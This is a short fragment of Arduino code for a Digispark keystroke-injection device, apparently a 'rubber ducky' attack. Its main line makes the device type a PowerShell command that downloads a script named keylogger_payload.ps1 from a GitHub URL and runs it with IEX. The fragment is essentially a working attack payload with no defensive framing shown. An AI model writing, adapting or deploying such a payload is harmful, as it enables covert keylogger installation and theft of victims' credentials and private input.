...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Frid47/rubber_ducky/main/keylogger_payload.ps1');\"");
